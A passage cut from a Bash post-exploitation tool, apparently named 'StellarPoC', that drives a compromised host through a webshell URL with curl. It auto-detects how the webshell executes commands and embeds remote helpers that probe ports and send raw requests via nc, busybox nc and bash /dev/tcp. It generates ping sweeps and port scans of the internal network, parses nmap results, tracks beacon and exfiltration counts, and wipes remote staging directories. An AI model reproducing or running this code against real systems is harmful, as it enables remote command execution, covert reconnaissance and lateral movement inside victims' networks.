    RUNTIME_DIR=$(normalize_remote_runtime_path "$1")
    validate_remote_runtime_path_safety "${RUNTIME_DIR}"
    refresh_runtime_paths
}

validate_local_report_path_safety() {
    local path="$1"
    if [[ -z "${path}" ]]; then
        log_message "ERROR" "Report path is empty"
        exit 1
    fi
    if [[ "${path}" =~ [[:cntrl:]] ]] || [[ "${path}" == *".."* ]]; then
        log_message "ERROR" "Report path contains unsafe characters or ..: ${path}"
        exit 1
    fi
    if [[ "${path}" == "/" ]]; then
        log_message "ERROR" "Report path cannot be filesystem root"
        exit 1
    fi
}

report_output_path_is_safe() {
    local p="$1"
    [[ -n "${p}" && -n "${EFFECTIVE_REPORT_DIR}" ]] || return 1
    case "${p}" in
        "${EFFECTIVE_REPORT_DIR}"|"${EFFECTIVE_REPORT_DIR}"/*) return 0 ;;
        *) return 1 ;;
    esac
}

check_webshell_payload_size() {
    local context="$1" bytes="$2"
    if (( bytes > PAYLOAD_MAX_BYTES )); then
        log_message "ERROR" "Webshell payload too large (${bytes} bytes > ${PAYLOAD_MAX_BYTES}) at context=${context}. Reduce scan scope, use --profile stealth, or split stages with --single-stage."
        return 1
    fi
    if (( bytes > PAYLOAD_WARN_BYTES )); then
        log_message "WARN" "Large webshell payload (${bytes} bytes) at context=${context}; may exceed URL/servlet/proxy limits. Prefer --webshell-method POST if using GET."
    fi
    return 0
}

safe_local_rm_runtime_dir() {
    [[ "${DRY_RUN}" == true ]] && return 0
    [[ -z "${RUNTIME_DIR}" || ! -d "${RUNTIME_DIR}" ]] && return 0
    if path_is_safe_for_remote_deletion "${RUNTIME_DIR}"; then
        rm -rf "${RUNTIME_DIR}" 2>/dev/null || true
    else
        log_message "WARN" "Refusing local removal of unsafe runtime path: ${RUNTIME_DIR} (${RUNTIME_PATH_SAFETY_REASON})"
    fi
}

safe_remote_rm_rf() {
  local -a safe_paths=() p q
  for p in "$@"; do
    [[ -n "${p}" ]] || continue
    if path_is_safe_for_remote_deletion "${p}"; then
      printf -v q '%q' "${p}"
      safe_paths+=("${q}")
    else
      log_message "WARN" "Refusing remote rm -rf on unsafe path: ${p} (${RUNTIME_PATH_SAFETY_REASON:-policy violation})"
    fi
  done
  if ((${#safe_paths[@]} == 0)); then
    return 1
  fi
  printf 'rm -rf %s 2>/dev/null || true' "${safe_paths[*]}"
}

safe_remote_cleanup_stage_artifacts() {
  local cmd q_stg q_fake q_rt
  if ! path_is_safe_for_remote_deletion "${REMOTE_RUNTIME_DIR}"; then
    log_message "WARN" "Skipping remote stage cleanup: unsafe REMOTE_RUNTIME_DIR (${RUNTIME_PATH_SAFETY_REASON})"
    return 1
  fi
  if ! path_is_safe_for_remote_deletion "${REMOTE_STAGING_DIR}" \
      || ! path_is_safe_for_remote_deletion "${REMOTE_FAKE_DIR}"; then
    log_message "WARN" "Skipping remote stage cleanup: unsafe staging/fake path"
    return 1
  fi
  printf -v q_stg '%q' "${REMOTE_STAGING_DIR}"
  printf -v q_fake '%q' "${REMOTE_FAKE_DIR}"
  printf -v q_rt '%q' "${REMOTE_RUNTIME_DIR}"
  cmd="find ${q_stg} -mindepth 1 -maxdepth 1 -exec rm -rf {} + 2>/dev/null || true; "
  cmd+="find ${q_fake} -mindepth 1 -maxdepth 1 -exec rm -rf {} + 2>/dev/null || true; "
  cmd+="find ${q_rt} -maxdepth 1 \\( -name '*.txt' -o -name '*.gnmap' \\) -exec rm -f {} + 2>/dev/null || true"
  printf '%s' "${cmd}"
}

resolve_report_dirs() {
    local uid user_tag candidate base
    uid="$(id -u 2>/dev/null || echo 0)"
    user_tag="${USER:-u${uid}}"

    if [[ -n "${REPORT_DIR}" ]]; then
        EFFECTIVE_REPORT_DIR=$(canonicalize_path "${REPORT_DIR}")
        validate_local_report_path_safety "${EFFECTIVE_REPORT_DIR}"
        REPORT_BASE_DIR=$(dirname "${EFFECTIVE_REPORT_DIR}")
        REPORT_DIR="${EFFECTIVE_REPORT_DIR}"
        REPORT_PRESERVED=true
        LOG_DIR="${EFFECTIVE_REPORT_DIR}/logs"
        return 0
    fi

    for base in "${HOME}/.stellar_poc_reports" "/tmp/.stellar_poc_reports_${user_tag}"; do
        candidate="${base}/${CAMPAIGN_ID}"
        candidate=$(canonicalize_path "${candidate}")
        if mkdir -p "${candidate}" 2>/dev/null && [[ -d "${candidate}" && -w "${candidate}" ]]; then
            EFFECTIVE_REPORT_DIR="${candidate}"
            REPORT_BASE_DIR="${base}"
            REPORT_DIR="${EFFECTIVE_REPORT_DIR}"
            REPORT_PRESERVED=true
            LOG_DIR="${EFFECTIVE_REPORT_DIR}/logs"
            return 0
        fi
    done

    candidate=$(mktemp -d "/tmp/.stellar_poc_reports_${user_tag}_XXXXXX" 2>/dev/null || true)
    if [[ -n "${candidate}" ]]; then
        EFFECTIVE_REPORT_DIR="${candidate}/${CAMPAIGN_ID}"
        mkdir -p "${EFFECTIVE_REPORT_DIR}" 2>/dev/null || true
        REPORT_BASE_DIR="${candidate}"
        REPORT_DIR="${EFFECTIVE_REPORT_DIR}"
        REPORT_PRESERVED=true
        LOG_DIR="${EFFECTIVE_REPORT_DIR}/logs"
        log_message "WARN" "Using emergency report directory: ${EFFECTIVE_REPORT_DIR}"
        return 0
    fi

    log_message "ERROR" "Failed to initialize persistent report directory"
    exit 1
}

preserve_reports_from_runtime() {
    local src dst
    [[ "${DRY_RUN}" == true ]] && return 0
    [[ "${REPORT_COPY_PERFORMED}" == true ]] && return 0
    src="${REMOTE_RUNTIME_DIR}/reports"
    if [[ ! -d "${src}" ]]; then
        return 0
    fi
    if ! report_path_is_under_runtime "${src}"; then
        return 0
    fi
    dst="${EFFECTIVE_REPORT_DIR}"
    if ! report_output_path_is_safe "${dst}"; then
        log_message "WARN" "Refusing report copy: destination outside operator report dir"
        return 0
    fi
    mkdir -p "${dst}" 2>/dev/null || true
    if cp -a "${src}/." "${dst}/" 2>/dev/null; then
        REPORT_COPY_PERFORMED=true
        log_message "OK" "Copied reports from ephemeral runtime to ${dst}"
    else
        log_message "WARN" "Could not copy reports from ${src} to ${dst}"
    fi
}

canonicalize_path() {
    local in="$1" out
    if [[ -z "${in}" ]]; then
        return 1
    fi
    if [[ "${in}" == /* ]]; then
        out="${in}"
    else
        out="${PWD}/${in}"
    fi
    local parent
    parent=$(dirname "${out}")
    mkdir -p "${parent}" 2>/dev/null || true
    if [[ -d "${out}" ]]; then
        (cd "${out}" 2>/dev/null && pwd -P) || printf '%s' "${out}"
    else
        printf '%s' "${out}"
    fi
}

runtime_owner_uid() {
    local path="$1"
    if stat -c %u "${path}" >/dev/null 2>&1; then
        stat -c %u "${path}" 2>/dev/null
    elif stat -f %u "${path}" >/dev/null 2>&1; then
        stat -f %u "${path}" 2>/dev/null
    else
        echo ""
    fi
}

runtime_is_usable_dir() {
    local path="$1"
    [[ -n "${path}" ]] || return 1
    mkdir -p "${path}" 2>/dev/null || return 1
    if [[ ! -w "${path}" ]]; then
        RUNTIME_DIAGNOSTIC="not writable: ${path}"
        return 1
    fi
    local uid owner_uid lock_file
    uid=$(id -u 2>/dev/null || echo "")
    owner_uid=$(runtime_owner_uid "${path}")
    if [[ -n "${uid}" && -n "${owner_uid}" && "${uid}" != "${owner_uid}" ]]; then
        RUNTIME_OWNERSHIP_ISSUE=true
        RUNTIME_DIAGNOSTIC="ownership mismatch (owner=${owner_uid}, uid=${uid}) at ${path}"
        return 1
    fi
    lock_file="${path}/.runtime_write_test.lock"
    if command -v flock >/dev/null 2>&1; then
        { flock -x 201 && printf 'ok\n' >> "${path}/.runtime_write_test"; } 201>"${lock_file}" 2>/dev/null || return 1
    else
        printf 'ok\n' >> "${path}/.runtime_write_test" 2>/dev/null || return 1
    fi
    rm -f "${path}/.runtime_write_test" "${lock_file}" 2>/dev/null || true
    return 0
}

cleanup_stale_runtime_dirs() {
    local base tmp_pat user_tag uid_tag
    user_tag="${USER:-u}"
    uid_tag="$(id -u 2>/dev/null || echo 0)"
    for base in "/tmp/.poc_runtime_${user_tag}" "/tmp/.poc_runtime_${uid_tag}" "/tmp/.stellar_poc_${user_tag}"; do
        tmp_pat="${base}*"
        # Only clean matching own-user dirs older than 7 days.
        find /tmp -maxdepth 1 -mindepth 1 -type d -name "$(basename "${tmp_pat}")" -mtime +7 -user "${user_tag}" -exec rm -rf {} + 2>/dev/null || true
    done
}

resolve_runtime_dir() {
    local uid user_tag now candidate
    uid="$(id -u 2>/dev/null || echo 0)"
    user_tag="${USER:-u${uid}}"
    now="$(date +%s)"
    cleanup_stale_runtime_dirs

    # Priority 1: --secure-runtime (remote ephemeral path; created on webshell host)
    if [[ "${SECURE_RUNTIME}" == true ]]; then
        assign_remote_runtime_dir "/tmp/.stellar_poc_${user_tag}_${now}_${RANDOM}"
        RUNTIME_MODE="secure-remote-ephemeral"
        RUNTIME_EPHEMERAL=true
        CLEANUP_RUNTIME_ON_EXIT=true
        return 0
    fi

    # Priority 2: explicit --runtime-dir (validated before use)
    if [[ -n "${CUSTOM_RUNTIME_DIR}" ]]; then
        assign_remote_runtime_dir "${CUSTOM_RUNTIME_DIR}"
        RUNTIME_MODE="custom-remote"
        RUNTIME_EPHEMERAL=false
        return 0
    fi

    # Priority 3-5: default remote /tmp paths (validated on webshell host via preflight)
    if [[ "${RUNTIME_FALLBACK_USED}" == true ]]; then
        assign_remote_runtime_dir "/tmp/.poc_runtime_${uid}"
        RUNTIME_MODE="auto-fallback-uid"
        log_message "WARN" "Using remote runtime fallback path: ${REMOTE_RUNTIME_DIR}"
    else
        assign_remote_runtime_dir "/tmp/.poc_runtime_${user_tag}"
        if [[ "${RUNTIME_MODE}" == "default-user" ]]; then
            RUNTIME_MODE="auto-default"
        fi
    fi
    RUNTIME_EPHEMERAL=false
    return 0
}

add_executed_stage() { state_append "executed_stages.log" "$1"; }
add_skipped_stage() { state_append "skipped_stages.log" "$1 | Reason: $2"; }
add_fallback_usage() { state_append "fallback_usage.log" "$1"; }
add_dependency_status() { state_append "dependency_status.log" "$1"; }
add_preflight_result() { state_append "preflight_results.log" "$1"; }
increment_beacon_count() { atomic_append_file "${LOCAL_STATE_DIR}/beacon_count.log" "1"; }
increment_exfil_count() { atomic_append_file "${LOCAL_STATE_DIR}/exfil_count.log" "1"; }
increment_beacon_attempt() { atomic_append_file "${LOCAL_STATE_DIR}/beacon_attempt_count.log" "1"; }
increment_beacon_success() { atomic_append_file "${LOCAL_STATE_DIR}/beacon_success_count.log" "1"; }
increment_exfil_attempt() { atomic_append_file "${LOCAL_STATE_DIR}/exfil_attempt_count.log" "1"; }
increment_exfil_success() { atomic_append_file "${LOCAL_STATE_DIR}/exfil_success_count.log" "1"; }
normalize_stage_status() {
    case "$1" in
        Success|Partial|Fallback|Skipped|Failed) printf '%s' "$1" ;;
        success|SUCCESS|start|Start) printf 'Success' ;;
        partial|PARTIAL) printf 'Partial' ;;
        fallback|FALLBACK) printf 'Fallback' ;;
        skipped|SKIPPED) printf 'Skipped' ;;
        failed|FAILED) printf 'Failed' ;;
        *) printf 'Partial' ;;
    esac
}

set_stage_result() {
    local stage="$1" status reason
    status=$(normalize_stage_status "$2")
    reason="${3:-}"
    state_append "stage_results.log" "${stage}: ${status}${reason:+ | Reason: ${reason}}"
}

b64_encode_no_wrap() {
    if base64 -w 0 </dev/null 2>/dev/null; then
        base64 -w 0
    elif command -v openssl >/dev/null 2>&1; then
        openssl base64 | tr -d '\n'
    else
        base64 | tr -d '\n'
    fi
}

generate_random_string() {
    local len="${1:-16}" charset="${2:-a-z0-9}" out=""
    if [[ -r /dev/urandom ]]; then
        out=$(head -c "$((len * 4))" /dev/urandom 2>/dev/null | tr -dc "${charset}" | head -c "${len}")
    fi
    if [[ -z "${out}" ]] && command -v openssl >/dev/null 2>&1; then
        out=$(openssl rand -hex "$((len * 2))" 2>/dev/null | tr -dc "${charset}" | head -c "${len}")
    fi
    if [[ -z "${out}" ]]; then
        out=$(printf '%s%s%s' "${RANDOM}" "${RANDOM}" "$(date +%s%N)" | tr -dc "${charset}" | head -c "${len}")
    fi
    printf '%s' "${out:-poc$(date +%s)}"
}

generate_random_base64() {
    local nbytes="${1:-32}"
    if [[ -r /dev/urandom ]]; then
        head -c "${nbytes}" /dev/urandom 2>/dev/null | b64_encode_no_wrap
        return 0
    fi
    if command -v openssl >/dev/null 2>&1; then
        openssl rand "${nbytes}" 2>/dev/null | b64_encode_no_wrap
        return 0
    fi
    generate_random_string "$((nbytes * 2))" 'A-Za-z0-9+/=' | b64_encode_no_wrap
}

# Embedded once in complex remote payloads (BusyBox/Alpine safe).
# shellcheck disable=SC2016
REMOTE_SHELL_HELPERS='b64_nw(){ if command -v base64 >/dev/null 2>&1; then base64 -w 0 2>/dev/null || base64 | tr -d "\n"; elif command -v openssl >/dev/null 2>&1; then openssl base64 | tr -d "\n"; else cat; fi; }; rand_bytes(){ n="$1"; if [ -r /dev/urandom ]; then head -c "$n" /dev/urandom 2>/dev/null; elif command -v openssl >/dev/null 2>&1; then openssl rand -hex "$n" 2>/dev/null; else printf "%s%s" "$RANDOM" "$RANDOM"; fi; }; seq_list(){ m="$1"; i=1; if command -v seq >/dev/null 2>&1; then seq 1 "$m"; else while [ "$i" -le "$m" ]; do echo "$i"; i=$((i+1)); done; fi; }; poc_port_probe(){ h="$1"; p="$2"; if command -v nc >/dev/null 2>&1; then nc -z -w1 "$h" "$p" 2>/dev/null && return 0; fi; if command -v busybox >/dev/null 2>&1; then busybox nc -z -w1 "$h" "$p" 2>/dev/null && return 0; fi; if command -v telnet >/dev/null 2>&1; then (echo quit | telnet "$h" "$p" 2>&1 | grep -qi -e connected -e open) && return 0; fi; if command -v bash >/dev/null 2>&1; then bash -c "echo >/dev/tcp/${h}/${p}" 2>/dev/null && return 0; fi; return 1; }; poc_http_send(){ host="$1"; port="$2"; req="$3"; if command -v nc >/dev/null 2>&1; then printf "%b" "$req" | nc -w3 "$host" "$port" >/dev/null 2>&1; return $?; fi; if command -v busybox >/dev/null 2>&1; then printf "%b" "$req" | busybox nc -w3 "$host" "$port" >/dev/null 2>&1; return $?; fi; if command -v bash >/dev/null 2>&1; then bash -c "exec 3<>/dev/tcp/${host}/${port}; printf \"%b\" \"$req\" >&3; cat <&3 >/dev/null; exec 3<&-; exec 3>&-" >/dev/null 2>&1; return $?; fi; return 1; }'

has_local_timeout() {
    command -v timeout >/dev/null 2>&1
}

assess_local_capabilities() {
    if [[ "${LOCAL_HAS_CURL}" != true ]]; then
        log_message "ERROR" "Local curl binary required."
        exit 1
    fi
    add_dependency_status "local-curl: detected"
    if printf 'x\n' | xargs -P 2 -I{} echo test >/dev/null 2>&1; then
        LOCAL_XARGS_PARALLEL_SUPPORTED=true
        add_dependency_status "local-xargs_parallel: supported"
    else
        LOCAL_XARGS_PARALLEL_SUPPORTED=false
        add_dependency_status "local-xargs_parallel: unsupported"
        add_fallback_usage "Local xargs -P unsupported (informational)"
    fi
}

assess_remote_xargs_parallel() {
    local out
    if [[ "${DRY_RUN}" == true ]]; then
        REMOTE_XARGS_PARALLEL_SUPPORTED=false
        add_dependency_status "remote-xargs_parallel: not checked (dry-run)"
        return 0
    fi
    out=$(run_webshell_raw "test-xargs-parallel" "printf 'x\n' | xargs -P 2 -I{} echo test >/dev/null 2>&1 && echo XARGS_P_OK || echo XARGS_P_NO")
    if [[ "${out}" == *"XARGS_P_OK"* ]]; then
        REMOTE_XARGS_PARALLEL_SUPPORTED=true
        add_dependency_status "remote-xargs_parallel: supported"
    else
        REMOTE_XARGS_PARALLEL_SUPPORTED=false
        add_dependency_status "remote-xargs_parallel: unsupported"
        add_fallback_usage "Remote xargs -P unsupported; sequential scan fallback enabled"
    fi
}

# Remote port probe: bash /dev/tcp -> nc -> busybox nc -> telnet -> graceful no-op.
build_remote_tcp_probe() {
    local host="$1" port="$2"
    if [[ ! "${host}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || [[ ! "${port}" =~ ^[0-9]+$ ]]; then
        return 1
    fi
    printf 'poc_port_probe %q %q 2>/dev/null || true' "${host}" "${port}"
}

build_remote_tcp_probe_cmd() {
    local probe
    probe=$(build_remote_tcp_probe "$1" "$2") || return 1
    printf '%s %s' "${REMOTE_SHELL_HELPERS}" "${probe}"
}

build_remote_tcp_probe_long() {
    build_remote_tcp_probe "$1" "$2"
}

select_remote_shell_bin() {
    if [[ "${HAS_bash:-false}" == true ]]; then
        REMOTE_SHELL_BIN="bash"
    else
        REMOTE_SHELL_BIN="sh"
    fi
}

wrap_remote_payload() {
    local payload="$1"
    # Typical JSP/PHP webshells already invoke /bin/sh -c on cmd — send raw script.
    if [[ "${WEBSHELL_CMD_STYLE}" == "raw" ]]; then
        printf '%s' "${payload}"
        return 0
    fi
    if [[ "${REMOTE_WRAP_READY}" == true && "${HAS_timeout:-false}" == true ]]; then
        printf 'timeout 15 %q -c %q 2>&1 || true' "${REMOTE_SHELL_BIN}" "${payload}"
    else
        printf '%q -c %q 2>&1 || true' "${REMOTE_SHELL_BIN}" "${payload}"
    fi
}

normalize_webshell_response() {
    local raw="$1"
    printf '%s' "${raw}" | tr -d '\r' | sed -e 's/<[^>][^>]*>//g' -e 's/&nbsp;/ /g' -e 's/&lt;/</g' -e 's/&gt;/>/g' -e 's/&amp;/\&/g'
}

webshell_curl_transport() {
    local wrapped="$1" curl_max="${2:-15}"
    build_curl_common_args "${curl_max}"
    local args=("${CURL_COMMON_ARGS[@]}")
    if [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
        args+=(--get --data-urlencode "cmd=${wrapped}")
    else
        args+=(--data-urlencode "cmd=${wrapped}")
    fi
    local body http_code
    body=$(curl "${args[@]}" -w $'\n%{http_code}' "${WEB_SHELL_URL}" 2>/dev/null || printf '\n000')
    http_code="${body##*$'\n'}"
    body="${body%$'\n'*}"
    WEBSHELL_LAST_HTTP_CODE="${http_code}"
    normalize_webshell_response "${body}"
}

detect_webshell_command_style() {
    local token="$1" style wrapped body http_code preview saved_method
    token="${token:-STELLAR_POC_PROBE_${RANDOM}}"
    saved_method="${WEBSHELL_METHOD}"
    for style in raw wrapped_sh wrapped_bash; do
        case "${style}" in
            raw) wrapped="echo ${token}" ;;
            wrapped_sh) wrapped=$(printf 'sh -c %q 2>&1 || true' "echo ${token}") ;;
            wrapped_bash) wrapped=$(printf 'bash -c %q 2>&1 || true' "echo ${token}") ;;
        esac
        for WEBSHELL_METHOD in GET POST; do
            body=$(webshell_curl_transport "${wrapped}" 12)
            http_code="${WEBSHELL_LAST_HTTP_CODE}"
            if [[ "${body}" == *"${token}"* ]]; then
                WEBSHELL_CMD_STYLE="${style}"
                add_preflight_result "[+] Command execution confirmed (style=${style} method=${WEBSHELL_METHOD})"
                vlog "Webshell cmd style=${style} method=${WEBSHELL_METHOD} http=${http_code}"
                return 0
            fi
            vlog "Probe style=${style} method=${WEBSHELL_METHOD} http=${http_code} body=$(printf '%.120s' "${body}")"
        done
    done
    WEBSHELL_METHOD="${saved_method}"
    body=$(webshell_curl_transport "echo ${token}" 12)
    preview=$(printf '%.160s' "${body}" | tr '\n' ' ')
    add_preflight_result "[-] Command execution failed (HTTP ${WEBSHELL_LAST_HTTP_CODE:-000} preview=${preview})"
    log_message "ERROR" "Command execution validation failed (HTTP ${WEBSHELL_LAST_HTTP_CODE:-000}) — try --verbose or --webshell-method POST"
    vlog "Webshell probe response: ${body}"
    return 1
}

build_curl_common_args() {
    local max_time="${1:-25}"
    CURL_COMMON_ARGS=(--silent --show-error --max-time "${max_time}" --connect-timeout 8 --retry 1 --retry-delay 1)
}

run_webshell_quick() {
    _webshell_invoke "$1" "$2" "quick"
}

run_webshell_long() {
    _webshell_invoke "$1" "$2" "long"
}

WEBSHELL_LONG_TIMEOUT=300
DISCOVERY_CHUNK_SIZE=32
DISCOVERY_NMAP_INLINE_OK=false

append_curl_telemetry_headers() {
    local -n _args="${1:?}"
    _args+=(-H "X-PoC-Campaign: ${CAMPAIGN_ID}" -H "X-Operator: StellarPoC")
}

# Build remote webshell payload that invokes curl on the compromised host.
build_remote_curl_invocation() {
    local -a curl_args=("$@")
    if [[ "${HAS_curl:-false}" != true ]]; then
        printf 'echo POC_REMOTE_CURL_MISSING; false'
        return 0
    fi
    remote_join_args curl "${curl_args[@]}"
}

build_remote_network_discovery_fallback() {
    if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
        cat <<EOF
${REMOTE_SHELL_HELPERS}
seq_list 254 | xargs -I{} -P ${PING_SWEEP_PARALLELISM} sh -c 'ping -c 1 -W 1 ${NETWORK_PREFIX}.\$1 >/dev/null 2>&1 || true' _ {}
EOF
    else
        cat <<EOF
${REMOTE_SHELL_HELPERS}
for i in \$(seq_list 254); do ping -c 1 -W 1 ${NETWORK_PREFIX}.\${i} >/dev/null 2>&1 || true; done
EOF
    fi
}

build_remote_service_discovery_fallback() {
    local xargs_block sequential_block
    if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
        xargs_block="seq_list 254 | xargs -I{} -P ${FALLBACK_SCAN_PARALLELISM} sh -c '
h=\"\${NP}.\$1\"
hosttag=\"\$(echo \"\${h}\" | tr . _)\"
for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
  port=\"\${spec%%:*}\"
  file=\"\${spec#*:}\"
  outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
done
' _ {}"
    else
        sequential_block="for i in \$(seq_list 254); do
  h=\"\${NP}.\${i}\"
  hosttag=\"\$(echo \"\${h}\" | tr . _)\"
  for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
    port=\"\${spec%%:*}\"
    file=\"\${spec#*:}\"
    outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
  done
done"
        xargs_block="${sequential_block}"
    fi
    cat <<EOF
${REMOTE_SHELL_HELPERS}
RD='${REMOTE_RUNTIME_DIR}'
NP='${NETWORK_PREFIX}'
SCAN_DIR="\${RD}/.scan_tmp"
mkdir -p "\${SCAN_DIR}"
export RD NP SCAN_DIR
${xargs_block} || true
for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
  : > "\${RD}/\${f}"
  cat "\${SCAN_DIR}/\${f}."* 2>/dev/null >> "\${RD}/\${f}" || true
  [ -s "\${RD}/\${f}" ] && sort -u "\${RD}/\${f}" -o "\${RD}/\${f}"
done
rm -rf "\${SCAN_DIR}" 2>/dev/null || true
EOF
}

build_remote_service_discovery_chunk() {
    local start="$1" end="$2" xargs_block
    if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
        xargs_block="seq_list ${end} | awk -v s=${start} '\$1>=s' | xargs -I{} -P ${FALLBACK_SCAN_PARALLELISM} sh -c '
h=\"\${NP}.\$1\"
hosttag=\"\$(echo \"\${h}\" | tr . _)\"
for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
  port=\"\${spec%%:*}\"
  file=\"\${spec#*:}\"
  outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
done
' _ {}"
    else
        xargs_block="for i in \$(seq_list ${end}); do
  [ \"\${i}\" -lt ${start} ] && continue
  h=\"\${NP}.\${i}\"
  hosttag=\"\$(echo \"\${h}\" | tr . _)\"
  for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
    port=\"\${spec%%:*}\"
    file=\"\${spec#*:}\"
    outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
  done
done"
    fi
    cat <<EOF
${REMOTE_SHELL_HELPERS}
RD='${REMOTE_RUNTIME_DIR}'
NP='${NETWORK_PREFIX}'
SCAN_DIR="\${RD}/.scan_tmp.${start}_${end}"
mkdir -p "\${SCAN_DIR}"
export RD NP SCAN_DIR
${xargs_block} || true
for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
  cat "\${SCAN_DIR}/\${f}."* 2>/dev/null >> "\${RD}/\${f}" || true
  [ -s "\${RD}/\${f}" ] && sort -u "\${RD}/\${f}" -o "\${RD}/\${f}"
done
rm -rf "\${SCAN_DIR}" 2>/dev/null || true
EOF
}

append_parse_nmap_gnmap() {
    local gnmap_path="$1"
    if [[ "${HAS_python3:-false}" == true ]]; then
        local parser_py
        parser_py=$(cat <<PY
import os,re
src="${gnmap_path}"
rd="${REMOTE_RUNTIME_DIR}"
maps={22:"ssh_hosts.txt",53:"dns_hosts.txt",80:"http_targets.txt",443:"https_targets.txt",445:"smb_hosts.txt",389:"ldap_hosts.txt",8080:"http_targets.txt",8443:"https_targets.txt",6379:"redis_hosts.txt",9200:"elastic_hosts.txt",27017:"mongo_hosts.txt"}
if os.path.exists(src):
    fhs={p:open(os.path.join(rd,n),"a",encoding="utf-8") for p,n in maps.items()}
    for line in open(src,encoding="utf-8",errors="ignore"):
        if "Ports:" not in line: continue
        parts=line.split()
        if len(parts)<2: continue
        ip=parts[1]
        for mp in re.findall(r"(\\d+)/open",line):
            p=int(mp)
            if p in fhs: fhs[p].write(ip+"\\n")
    for fh in fhs.values(): fh.close()
PY
)
        run_remote_python "parse-nmap-${gnmap_path##*/}" "${parser_py}"
    else
        run_webshell_quick "parse-nmap-${gnmap_path##*/}" \
            "test -f '${gnmap_path}' && awk '/Ports:/{ip=\$2; if(\$0~/(22\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ssh_hosts.txt\"; if(\$0~/(53\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/dns_hosts.txt\"; if(\$0~/(80\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(443\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(445\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/smb_hosts.txt\"; if(\$0~/(389\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ldap_hosts.txt\"; if(\$0~/(8080\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8443\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(6379\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/redis_hosts.txt\"; if(\$0~/(9200\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/elastic_hosts.txt\"; if(\$0~/(27017\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/mongo_hosts.txt\"}' '${gnmap_path}' || true"
    fi
}

dedupe_remote_host_files() {
    run_webshell_quick "dedupe-host-files" \
        "for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do [ -s '${REMOTE_RUNTIME_DIR}'/\$f ] && sort -u '${REMOTE_RUNTIME_DIR}'/\$f -o '${REMOTE_RUNTIME_DIR}'/\$f; done" \
        >/dev/null 2>&1 || true
}

discovery_port_to_file() {
    case "$1" in
        22) printf '%s' "ssh_hosts.txt" ;;
        53) printf '%s' "dns_hosts.txt" ;;
        80|8080) printf '%s' "http_targets.txt" ;;
        443|8443) printf '%s' "https_targets.txt" ;;
        445) printf '%s' "smb_hosts.txt" ;;
        389) printf '%s' "ldap_hosts.txt" ;;
        6379) printf '%s' "redis_hosts.txt" ;;
        9200) printf '%s' "elastic_hosts.txt" ;;
        27017) printf '%s' "mongo_hosts.txt" ;;
        *) printf '%s' "" ;;
    esac
}

dedupe_discovery_local_cache() {
    local f cache
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        if [[ -s "${cache}" ]]; then
            sort -u "${cache}" -o "${cache}"
        fi
    done
}

discovery_cache_append_host() {
    local host="$1" port="$2" file cache
    file=$(discovery_port_to_file "${port}")
    [[ -z "${file}" ]] && return 0
    discovery_local_cache_append "${host}" "${file}"
}

discovery_local_cache_append() {
    local host="$1" file="$2" cache
    [[ -z "${host}" || -z "${file}" || -z "${LOCAL_STATE_DIR}" ]] && return 0
    cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
